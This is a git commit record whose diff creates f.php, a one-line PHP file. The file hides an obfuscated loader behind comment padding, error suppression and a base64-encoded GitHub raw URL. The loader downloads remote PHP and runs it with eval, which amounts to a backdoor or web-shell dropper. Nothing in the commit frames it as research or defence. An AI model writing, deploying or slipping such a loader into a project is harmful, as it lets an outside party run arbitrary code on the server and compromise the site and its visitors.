b603f9701536e988960d43a3cccd154ba6f7e236
kabafaxz <afgskabafa@gmail.com>
2024-12-13 17:22:20 +0700

    Create f.php

---
+++ f.php
@@ -0,0 +1,1 @@
+gshhs<?php echo "sjsjsj";?><?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://".base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2thYmFmYXh6L3d3dy9yZWZzL2hlYWRzL21haW4vYS5waHA=")));/**/?>
